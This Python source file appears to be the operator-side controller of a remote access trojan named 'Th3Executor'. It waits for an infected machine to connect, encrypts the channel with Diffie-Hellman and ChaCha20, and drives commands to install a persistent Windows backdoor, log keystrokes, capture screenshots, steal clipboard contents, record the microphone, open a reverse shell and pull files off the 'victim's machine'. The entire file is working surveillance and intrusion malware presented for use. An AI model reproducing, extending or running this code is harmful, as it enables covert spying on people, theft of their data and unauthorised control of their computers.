# Cyrptographic Libraries
from Crypto.Util.number import getPrime, getRandomNBitInteger
from Crypto.Protocol.KDF import HKDF
from Crypto.Hash import SHA256
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes
# Main Libraries
import socket
import time
from termcolor import colored
import pickle
import uuid
import os
import logging

def intro_banner():
    banner = colored("""
  ________  _______ _______  __ ______________  ____________  ____ 
 /_  __/ / / /__  // ____/ |/ // ____/ ____/ / / /_  __/ __ \/ __ \\
  / / / /_/ / /_ </ __/  |   // __/ / /   / / / / / / / / / / /_/ /
 / / / __  /___/ / /___ /   |/ /___/ /___/ /_/ / / / / /_/ / _, _/ 
/_/ /_/ /_//____/_____//_/|_/_____/\____/\____/ /_/  \____/_/ |_|  
   """, "red", attrs=["bold"])
    intro_msg = colored("\nSilence the Noise, Amplify the Impact\n", attrs=["bold"])
    print(banner+intro_msg)

def log_banner():
    banner = """
 ______     __  __     ______     ______     __  __     ______   ______     ______           __         ______     ______       
/\  ___\   /\_\_\_\   /\  ___\   /\  ___\   /\ \/\ \   /\__  _\ /\  __ \   /\  == \         /\ \       /\  __ \   /\  ___\      
\ \  __\   \/_/\_\/_  \ \  __\   \ \ \____  \ \ \_\ \  \/_/\ \/ \ \ \/\ \  \ \  __<         \ \ \____  \ \ \/\ \  \ \ \__ \     
 \ \_____\   /\_\/\_\  \ \_____\  \ \_____\  \ \_____\    \ \_\  \ \_____\  \ \_\ \_\        \ \_____\  \ \_____\  \ \_____\    
  \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_____/     \/_/   \/_____/   \/_/ /_/         \/_____/   \/_____/   \/_____/    
 
                                                                                                                                
"""
    return banner

def start_diffie_hellman_exchange(conn_obj, bits=2048):
    # Generate prime p and base g
    p = getPrime(bits)
    g = 2

    # Generate server's private and public key
    private_key = getRandomNBitInteger(bits)
    public_key = pow(g, private_key, p)

    # Send p, g, and server's public key to client
    conn_obj.sendall(str(p).encode() + b'\n')
    conn_obj.sendall(str(g).encode() + b'\n')
    conn_obj.sendall(str(public_key).encode() + b'\n')

    # Receive client's public key
    client_public_key = int(conn_obj.recv(4096).decode().strip())

    # Compute the shared secret
    shared_secret = pow(client_public_key, private_key, p)

    # Derive a symmetric key from the shared secret
    symmetric_key = HKDF(shared_secret.to_bytes((shared_secret.bit_length() + 7) // 8, 'big'), 32, b'', SHA256)

    return symmetric_key

def attempt_exchange(conn_obj):
    attempts = 0
    while attempts < 3:
        try:
            symmetric_key = start_diffie_hellman_exchange(conn_obj, 2048)
            return symmetric_key 
        except Exception as e:
            print(colored(f"[-] Unable to establish cryptographic keys, re-attempting . . . ({attempts+1}/3)", "red"))
            log_activity(f"Unable to establish cryptographic keys due to {e}, attempt ({attempts+1}/3)", "error")
            attempts += 1
            time.sleep(2)  # Wait for 2 seconds before retrying
            if attempts == 3:
                conn_obj.close()
                conn_obj = connect_target(port)
                attempts = 0

    print(colored("\n[-] Failed to establish a secure connection after several attempts. Try reconnecting with target!", "red"))
    return None  # Return None if all attempts fail  

def encrypt_message(plaintext):
    global symmetric_key
    if isinstance(plaintext, str):
        try:
            plaintext = plaintext.encode()
        except BytesWarning:
            plaintext = plaintext.encode('utf-8')
    else:
        plaintext = pickle.dumps(plaintext)

    # Generate a unique 12-byte nonce for each encryption
    nonce = get_random_bytes(12)
    cipher = ChaCha20.new(key=symmetric_key, nonce=nonce)
    encrypted_message = cipher.encrypt(plaintext)
    return nonce + encrypted_message 

def decrypt_message(encrypted_message):
    global symmetric_key
    
    # Check if the encrypted message has the minimum length for a nonce
    if len(encrypted_message) < 12:
        print(colored("[-] Content received is too short to decrypt, skipping data. Try again with the same command", "red"))
        log_activity("Data received from target contains too little information to be decrypted, data is skipped.", "error")
        return None
    
    nonce = encrypted_message[:12]
    ciphertext = encrypted_message[12:]
    
    try:
        cipher = ChaCha20.new(key=symmetric_key, nonce=nonce)
        decrypted_data = cipher.decrypt(ciphertext)
        # Check if the decrypted data is pickle data (usually for complex data types)
        try:
            return pickle.loads(decrypted_data)
        except pickle.UnpicklingError:
            # Return raw bytes if it's not pickle data
            return decrypted_data
    except Exception as e:
        print(f"[-] An unknown exception occurred: {e}, skipping data. Try again with the same command")
        log_activity(f"An unknown error has occurred in the decryption function: {e}.", "error")
        return None

def print_help_menu(commands):
    banner = colored('\nT H 3 E X E C U T O R   H E L P   M E N U', 'red', attrs=['bold', 'dark'])
    print(banner)
    print(colored('-' * 65, 'red')) 
    descriptions = {
        "kill": "Terminate and close the connection",
        "help": "Display this help menu",
        "persist": "Attempt to install a backdoor",
        "del_persist": "Attempt to remove the backdoor",
        "keylog_start": "Attempt to eavesdrop on keystrokes",
        "screenshot": "Capture image of targets screen",
        "sys_info": "Retrieve system information of the target",
        "shell": "Drop into a command shell on the target system",
        "migrate": "Transition to a new secure channel (New keys)",
        "clipboard_steal": "Listen for clipboard entries from target",
        "mic_record": "Attempt to record the targets microphone"
    }
    
    for command in commands:
        description = descriptions.get(command, "No description available.")
        print(colored(f"> {command:<15} - {description}", 'white'))
    print(colored('-' * 65, 'red'))

def sys_info_command(client_output):  
    decrypted_client_message = decrypt_message(client_output)
    
    if isinstance(decrypted_client_message, list):        
        result = []
        for info in decrypted_client_message:
            if "No information found" in info:
                result.append(colored(f"[-] {info}", "red"))
            else:
                result.append(colored(f"[+] {info}", "green"))

        return "\n".join(result) 
    else:
        log_activity("Unexpected data type recieved when trying to gather information about target system information.", "error")
        return colored("[-] Unexpected data type received", "red")

def persist_del_command(client_output):
    decrypted_client_message = decrypt_message(client_output).decode()
    if decrypted_client_message == "no_exist":
        return colored("[-] No persistance is currently active on the machine", "red")
    elif decrypted_client_message == "permission_denied":
        return colored("[-] Unable to delete : Permission Denied", "red")
    
    if decrypted_client_message == "success":
        return colored("[+] Persistance successfully deleted from target machine", "green")
    elif decrypted_client_message == "fail":
        return colored("[-] An unknown error has occured when trying to delete persistance", "red")
    
    return colored("[-] Unable to parse persistance output. This operation may or may not have worked", "red")

def persist_command(client_output):  
    decrypted_client_message = decrypt_message(client_output).decode()
    if decrypted_client_message == "created":
        log_activity("Th3Executor backdoor installed successfully on target machine. Persistance is now active.", "info")
        return colored("[+] Th3Executor backdoor installed successfully on target machine. Persistance is now active", "green")
    elif decrypted_client_message == "not_windows":
        log_activity("Target is not using a windows machine, persistance will not work.", "error")
        return colored("[-] Target is not using a windows machine, persistance will not work", "red")
    elif decrypted_client_message == "already_created":
        log_activity("Target already has persistance active on machine.", "debug")
        return colored("[-] Target already has persistance active", "red")
    else:        
        log_activity("An unidentified error has occured when attempting to create persistance.", "error")
        return colored("[-] An unidentified error has occured when attempting to create persistance", "red")  

def reliable_recieve(conn_obj, data_size):    
    log_activity(f"Connection timeout changed to suit {data_size} bytes of data.", "info")
    conn_obj.settimeout(max(10, data_size / (1024 * 1024)))  # Set dynamic timeout based on size
    
    received_data = b''
    print("[!] Collecting data from target, processing time depends on item size")
    while len(received_data) < data_size:
        packet = conn_obj.recv(min(4096, data_size - len(received_data)))  # Receive in chunks
        if not packet:
            log_activity("Connection closed or data ended unexpectedly when receiving screenshot data. Try again in a little moment.", "error")
            return None
        received_data += packet

    return received_data

def process_and_check_recieved_data(received_data, data_size):
    if isinstance(data_size, str):
        log_activity(f"Supposed to recieve the data size but got type 'str' instead, output : {data_size}", "error")
        return (f"[-] Error when getting file data {data_size}. Please try again.") # An error occured, print it
    
    # Check data integrity
    if len(received_data) != data_size:
        log_activity(f"Received data size ({len(received_data)}) does not match the expected size ({data_size}).", "error")
        return "Received data size does not match the expected size."
    
    # If all data is received properly, process it
    decrypted_data = decrypt_message(received_data)
    if decrypted_data is None:
        log_activity("Failed to decrypt screenshot or else data is corrupted. Try again in a little moment.", "error")
        return "Data is corrupted or else is in an invalid format"
    
    return decrypted_data

def createfile_nocollision(header, footer=None):
    if footer is None:
        footer = ""
    
    def generate_filename(header, footer):
        if "." in header:
            file_parts = header.split(".")
            return f"{file_parts[0]}_{str(uuid.uuid4())[:4]}.{file_parts[1]}"
        else:
            return f"{header}_{str(uuid.uuid4())[:4]}{footer}"
    
    filename = generate_filename(header, footer)
    
    while os.path.exists(filename):
        filename = generate_filename(header, footer)
        
    return filename

def screenshot_command(client_output, conn_obj):
    random_image_filename = createfile_nocollision("screenshot_data", ".png")
    
    # Required variables
    original_timeout = conn_obj.gettimeout()
    attempt = 0
    max_attempts = 3

    while attempt < max_attempts:
        try:
            if client_output is None:
                log_activity("The size of the decrypted data received is invalid. Please check your input and try the command again.", "error")
                raise ValueError("Decrypted size is received invalid, please try the command again")
            
            # Get size and recieve bytes
            data_size = int(client_output.decode().strip())
            received_data = reliable_recieve(conn_obj, data_size)

            # Decyrpt data
            decrypted_data = process_and_check_recieved_data(received_data, data_size)
            if "Failed" in decrypted_data:
                print(f"[!] An error has occured! {decrypted_data}")
                break

            # Check if the decrypted data starts with PNG signature
            if not decrypted_data.startswith(b'\x89PNG\r\n\x1a\n'):
                log_activity(f"Decrypted data does not start with a PNG signature ({decrypted_data[:10]}). Try again in a little moment.", "error")
                raise ValueError("Decrypted data does not start with PNG signature")

            # Save the decrypted image data to a file
            with open(random_image_filename, 'wb') as image_file:
                image_file.write(decrypted_data)

            log_activity(f"Screenshot {random_image_filename} has been saved in current program directory.", "info")
            return colored(f"[+] Screenshot image has been saved as {random_image_filename}", "green")

        except Exception as e:
            attempt += 1
            log_activity(f"Error when capturing screenshot ({e}). Retrying image capture on target, attempt {attempt}/{max_attempts}", "error")
            print(colored(f"[-] Error when capturing screenshot. Retrying image capture on target, attempt {attempt}/{max_attempts} . . .", "red"))
            time.sleep(2)  # Wait for 2 seconds before retrying

        finally:
            conn_obj.settimeout(original_timeout)  # Reset the timeout to original
            clear_socket_buffer(conn_obj)  # Clear the buffer to prevent leakage

    return colored("[-] Failed to capture screenshot after several attempts.", "red")

def clear_socket_buffer(conn_obj):
    original_timeout = conn_obj.gettimeout()
    conn_obj.settimeout(0.20) 
    
    try:
        while True:
            if conn_obj.recv(4096) == b'':
                break
    except socket.timeout:
        pass
    finally:
        conn_obj.settimeout(original_timeout)

def clear_screen():
    if os.name == "nt": 
        os.system("cls")  
    else:
        subprocess.run(["clear"], shell=True, check=True) 

def handle_reconnections(port, conn_obj):
    print(colored("[-] A fatal error has occurred, the target terminated the connection", "red"))
    connection_retry = input("Retry Connection (y/n)? > ").strip().lower()
    if connection_retry == "y":
        print("\n[!] Reattempting . . .")
        conn_obj = connect_target(port)
        print(colored("[+] Reconnected to target!", "green", attrs=['bold']))
        log_activity("Reconnected to target successfully.", "info")
        symmetric_key = attempt_exchange(conn_obj)
        if symmetric_key is None:
            log_activity("Failed to establish a symmetric key with the client during the Diffie-Hellman exchange after reconnection. Check network conditions and client configurations.", "error")
            conn_obj.close()
            exit()

        return conn_obj, symmetric_key
    else:
        log_activity("Program ended because the user did not want to reconnect with the target agaib.", "info")
        exit("Program ended")

def connect_target(port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to avaliable interface on the specified port
    listener.bind(('0.0.0.0', port))

    # Listen for incoming connections
    listener.listen(1)
    print(f"[!] Listening for incoming connections on port {port} ...")

    # Accept a connection when the client connects
    conn_obj, addr = listener.accept()

    return conn_obj

def configure_logging():
    current_date = time.strftime("%d-%m-%Y", time.localtime())
    log_file = createfile_nocollision(f"log_{current_date}", ".log")
        
    logging.basicConfig(filename=log_file, 
                        filemode="a", 
                        encoding='utf-8',
                        format="'%(asctime)s' - %(name)s → %(levelname)s: %(message)s",
                        datefmt="%Y-%m-%d %H:%M:%S", level=logging.DEBUG)  
  
    with open(log_file, "w") as file_log:
        file_log.write(log_banner())

def log_activity(audit_message, log_level):
    try:
        logger = logging.getLogger()
        log_func = getattr(logger, log_level.lower())
        log_func(audit_message)
    except Exception as e:
        print(colored(f"[-] Unable to add log to 'th3executor_activity.log' due to {e}. Skipping audit", "red"))   

def clipboard_steal_command(client_output, conn_obj):
    received_data = []

    decrypted_client_message = decrypt_message(client_output)  # Signal message
    if decrypted_client_message.decode() != "STARTED":
        return colored("[-] An error has occured when starting the clipboard steal function. Please try again in a few moments.", "red")

    conn_obj.settimeout(0.5)  # Set to 0.5 seconds or any appropriate low value
    print(f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}")
    
    while True:
        try:
            input("Press Ctrl+C to stop and receive clipboard data: ")
        except KeyboardInterrupt:
            conn_obj.sendall(encrypt_message("END"))
            print(f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}")
            print() # Clear above clutter
            
            break
        print("Invalid data, only press 'Ctrl+C' to stop")

    # Attempt to receive leftover data AFTER interrupt
    try:
        while True:
            try:
                output = decrypt_message(conn_obj.recv(4096))
                if output:
                    decoded_output = output.strip().decode() 
                    received_data.extend(decoded_output.split("\n"))
                else:
                    break
            except socket.timeout:
                break
    except Exception as e:
        print(f"[-] Error when trying to gather clipboard data: {e}")

    try:
        if not received_data:
            log_activity(f"No clipboard entries have been gathered.", "info")
        
            return "[-] No clipboard data gathered from target"
        else:
            print("Loading clipboard data . . .")
            print("Gathred clipboard data :")
            # Reorganise output
            result, counter = [], 0
            for data in received_data:
                counter += 1
                if data:
                    result.append(colored(f"[+] Clipboard Entry {counter} -> {data}", "green"))

            conn_obj.settimeout(10)  # Reset to original timeout
            log_activity(f"Gathred {len(result)} clipboard entries.", "info")
            
            return "\n".join(result) 
    finally:
        clear_socket_buffer(conn_obj)  # Clear the buffer to prevent leakage

def process_shell_prompt(output, conn_obj):
    clear_socket_buffer(conn_obj)
    try:
        # Decrypt the message and decode it
        decrypted_message = decrypt_message(output).decode()
        shell_prompt, message = '', ''
        
        # Strip the "::" delimiter to separate message and prompt
        if "::" in decrypted_message:
            parts = decrypted_message.split("::")
            try:
                if len(parts) == 2:
                    message, shell_prompt = parts
                else:
                    message = decrypted_message
                    shell_prompt = "No Username"
            finally:
                print(message)
        else:
            shell_prompt = decrypted_message
            
        # Check for "No Username"
        if shell_prompt == "No Username":
            raise Exception()

    except:
        print(f"[-] Unable to establish current shell path, using default placeholder instead")
        shell_prompt = "th3executor_victim_shell > "

    return shell_prompt

def shell_command(client_output, conn_obj):    
    print(f"[!] {colored('REVERSE SHELL ACTIVE', 'green')} - Type 'quit' or 'exit' to exit shell command")
    print("[!] Type 'help' to view the shell help menu \n")
    
    usr_input, shell_prompt = '', process_shell_prompt(client_output, conn_obj)
    
    while True:
        clear_socket_buffer(conn_obj)
        usr_input = input("\n" + colored(shell_prompt, attrs=["bold"])).strip()
        
        if usr_input == "clear" or usr_input == "cls":
            clear_screen()
            shell_banner()
            continue
        elif usr_input == "quit" or usr_input == "exit":
            clear_socket_buffer(conn_obj) 
            print("Redirecting you back to th3executor . . .")
            time.sleep(1.5)
            clear_screen()
            intro_banner()
        elif usr_input == "help":
            shell_help()
            continue
        elif usr_input == "commands_help":
            shell_cheat_sheet()
            continue
        
        conn_obj.sendall(encrypt_message(usr_input))  # Send command
        if usr_input == "quit" or usr_input == "exit":
            break
        
        if usr_input[:3] == 'cd ':
            try:
                shell_prompt = process_shell_prompt(conn_obj.recv(4029), conn_obj)
            except Exception as err:
                print(f"[-] Unable to change user directory, please try the command again -> {err}")
            finally:
                continue        
        elif usr_input.startswith("download "):
                download_output = download(conn_obj, usr_input)
                if download_output != "saved":
                    print(f"[-] An error has occured when downloading the file. {download_output}")
                else:
                    print(f"[+] File {usr_input[9::]} has been saved successfully in current directory")
                continue # Iterate again, return nothing
        elif usr_input[:6] == "upload":
            pass
        
        retry_counter = 0
        while retry_counter != 2:
            try:
                output = decrypt_message(conn_obj.recv(4096)).decode()
                output = output.replace("[NEWLINE]", "\n")
                break
            except:
                retry_counter += 1
                continue
        if retry_counter == 3:
            print("[-] Unable to parse and decrypt output from target after several attempts, skipping")
        else:
            print(output)

def download(conn_obj, usr_input):
    if len(usr_input) <= 9:
        return "[-] Incorrect command usage. Specify 'download' followed by the file path"
        
    # Send the command to the client
    conn_obj.sendall(encrypt_message(usr_input))
    
    try:
        data_size = int(decrypt_message(conn_obj.recv(1024)).decode().strip())
        if not data_size:
            return "[-] No data has been recieved from target."
        
        file_data = reliable_recieve(conn_obj, data_size)
        if not file_data:
            return "[-] No file data has been recieved from target."
                            
        if isinstance(data_size, str):
            return f"[-] An error occured when trying to get the file size. {file_data}"
        else:              
            file_data = process_and_check_recieved_data(file_data, data_size)
            if isinstance(file_data, str):
                return f"[-] An error occured when trying to get the file data. {file_data}"          
    except Exception as err:
        return f"[-] An unidentified error has occured : {err}"
        
    if file_data:
        base_file = os.path.basename(usr_input[9:])
        file_path = createfile_nocollision(f"downloaded_{base_file}")
        
        with open(file_path, "wb") as file:
            file.write(file_data) 

        return "saved"
    else:
        return "[-] No data has been recieved from the target. This can be due to a network issue, Try again."

def shell_banner():
    x = colored("x", "red", attrs=["bold"])
    banner = colored(f"""
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!&lt;   ~.U$X!?R$$$$$$$$
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$    {x} `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:&lt;` !    ~?T#$$@@W@*?$ {x} /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
      """)
    
    text = colored("\n- Embrace Power - Command and Conquer with Th3executor \n", attrs=["dark"])    
    print(banner + text)

def shell_cheat_sheet():
    print(colored("S H E L L  C H E A T  S H E E T  M E N U", attrs=["bold"]))
    print(colored("WINDOWS COMMANDS", "blue", attrs=['bold', 'dark']))

    win = {
        "ipconfig": "Enumerate network configuration",
        "tasklist": "List all running processes",
        "systeminfo": "Display detailed system information",
        "netstat -an": "Display all active connections and listening ports",
        "whoami": "Display the current user",
        "net user": "List all user accounts",
        "net localgroup": "List all local groups",
        "sc query": "Display the status of services",
        "dir": "List directory contents",
        "attrib": "Display or change file attributes"
    }
    for cmd, desc in win.items():
        print(f"> {cmd:<20} - {desc}")

    print("\n\t\t    >-------------<")
    
    print(colored('LINUX COMMANDS', 'blue', attrs=['bold', 'dark']))
    lin = {
        "ifconfig": "Enumerate network configuration",
        "ps aux": "List all running processes",
        "uname -a": "Display detailed system information",
        "netstat -an": "Display all active connections and listening ports",
        "whoami": "Display the current user",
        "cat /etc/passwd": "List all user accounts",
        "cat /etc/group": "List all groups",
        "systemctl status": "Display the status of services",
        "ls -la": "List directory contents",
        "chmod": "Change file permissions"
    }
    for cmd, desc in lin.items():
        print(f"> {cmd:<20} - {desc}")

def shell_help():
    banner = colored('\nS H E L L   M E N U', 'green', attrs=['bold', 'dark'])
    print(banner)
    print(colored('-' * 66, 'green')) 
    descriptions = {
        "download <file_path>": "Download a file from the victim's machine",
        "upload <file_path>": "Upload a file to the victim's machine",
        "help": "Display this help menu",
        "commands_help": "Display a windows and linux shell cheat sheet",
        "exit": "Exit the shell and return to th3executor"
    }
    
    for command, description in descriptions.items():
        print(f"> {command:<20} - {description}")
    print(colored('-' * 66, 'green'))

def shell_load(client_output, conn_obj):
    print("Loading up a shell enviroment . . .")
    time.sleep(1.5)
    clear_screen()
    shell_banner()
    shell_command(client_output, conn_obj)

    return "Shell Exited Successfully"

def disconnect_target(conn_obj, shutdown_signal):
    try:
        conn_obj.close()
        log_activity("Exited th3executor, connection terminated successfully on server end", "info")
    except Exception as err:
        print("[-] Program ended abruptly, no connection was probably established with target")
        log_activity(f"Exited th3executor, could not terminate connection on server side -> {err}", "error")

    if not shutdown_signal or shutdown_signal == "connection_not_closed":
        print(colored("[-] Target did not terminate the connection on their end", "red"))
        print(colored("[!] This can be due to a network problem, please wait a few moments before re-connecting", "yellow"))
        
        log_activity("Exited th3executor, connection was not terminated on targets end.", "error")
    elif shutdown_signal == "shutdown_confirmed":
        print(colored("[+] Connection terminated successfully on targets end", "green"))
        
        log_activity("Exited th3executor, connection terminated normally between both parties.", "info")
    else:
        print(colored("[-] Unknown shutdown code retireved, unable to parse output. Connection is probably still open", "red"))
        print(colored("[!] This can be due to a network problem, please wait a few moments before re-connecting", "yellow"))
        
        log_activity("Unknown shutdown code retireved, unable to parse output. Connection is probably still open.", "error")
    
# Required Variables
port = 5555 # SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)

# Th3Executor Banner    
intro_banner()

# Configure th3executor logger
configure_logging()

# Listen for connections from target
try:
    conn_obj = connect_target(port) 
except Exception as err:
    exit(colored(f"[-] Unable to connect to target : {err}", "red"))
    
conn_obj.settimeout(10)  # Set global timeout value
    
print(colored("[+] Connected to target", "green", attrs=["bold"]))
log_activity(f"Session started with target on port {port}.", "info")

# Create required variables to create a secure channel
print("[!] Establishing a secure connection ...")
symmetric_key = attempt_exchange(conn_obj)
if symmetric_key is None: 
    log_activity("Failed to establish a symmetric key with the client during the Diffie-Hellman exchange. Check network conditions and client configurations.", "error")
    conn_obj.close() # Close connection due to unsecured reasons
    exit()
    
print(colored("[+] Secure channel established","green", attrs=["bold"]))
log_activity("Key exchange completed, a secure channel has now been created.", "info")

# Commands application can use
commands = ["kill", "help", "persist", "del_persist", "keylog_start", "screenshot", "sys_info", "shell", "migrate", "clipboard_steal", "mic_record"]
print_help_menu(commands)

while True:
    try:
        command = input(colored("\nMagic Keyword > ", attrs=["bold"])).strip().lower()
    except KeyboardInterrupt:
        log_activity("User interrupted program with a keyboard interrupt.", "info")
        break
    
    # Basic commands
    if command not in commands:
        print("Invalid Command! Refer to help menu")
        continue
    elif command == "help":
        print_help_menu(commands)
        continue
    elif command == "kill":
        conn_obj.sendall(encrypt_message(command))
        conn_obj.settimeout(5)
        shutdown_signal = decrypt_message(conn_obj.recv(4096)).decode()
        if shutdown_signal == "retry":
            conn_obj.sendall(encrypt_message(command))
            shutdown_signal = decrypt_message(conn_obj.recv(4096))
        break
    
    # Send command to target and recieve response
    try:
        conn_obj.sendall(encrypt_message(command))
        client_output = conn_obj.recv(4096).strip()
        if decrypt_message(client_output).decode() == "retry":
            conn_obj.sendall(encrypt_message(command))
            client_output = conn_obj.recv(4096).strip()
        
        if "No information gathered" in decrypt_message(client_output).decode() or decrypt_message(client_output).decode() is None:
            print(f"[-] No information recieved from target when initiating command {command}")
            continue
    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
        if handle_reconnections(port, conn_obj) is None:
            log_activity("Unable to establish a secure connection with the target. Exiting application due to critical network failure.", "error") 
            exit(colored("[-] Unable to establish a secure connection with target. Exiting application", "red"))
        conn_obj.settimeout(10)  # Redefine global timeout value
        continue
    except (socket.timeout, TimeoutError):
        print(colored("[-] Timeout reached, skipping data . . .", "red"))
        log_activity("Timeout reached when trying to recieve data from target, data was skipped.", "debug")
        continue
    except:
        print(colored("[-] An unknown error has occured, skipping data", "red"))
        
    output = None
    try:
        if command == "sys_info":
            output = sys_info_command(client_output)
        elif command == "persist":
            output = persist_command(client_output)
        elif command == "del_persist":
            output = persist_del_command(client_output)
        elif command == "screenshot":
            output = screenshot_command(client_output, conn_obj)
        elif command == "clipboard_steal":
            output = clipboard_steal_command(client_output, conn_obj)
        elif command == "shell":
            output = shell_load(client_output, conn_obj)
    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
        log_activity("Connection with target and server has been dropped.", "debug")
        if handle_reconnections(port, conn_obj) is None: 
            log_activity("Unable to re-connect with target, either the symmetric key was not established or the target refused to connect.", "error")
            exit(colored("[-] Unable to establish a secure connection with target. Exiting application", "red"))
        else:
            log_activity("Connection re-established with target, new encyrption keys have also been created.", "info")
            conn_obj.settimeout(10)  # Redefine global timeout value
            continue
    except:
        output = None
    finally:
        if output is None or output == "No information gathered":
            print(colored("[-] Unable to recieve data from target, skipping", "red"))
            log_activity("Data recieved from target contains no information or server is unable to parse information recieved from target.", "debug")
        else:
            log_activity(f"Initiated command '{command}' to target which was executed successfully.", "info")
            print(output)

disconnect_target(conn_obj, shutdown_signal)
print(colored("\n[+] Program Ended - Come back another time", "yellow", attrs=["bold"]))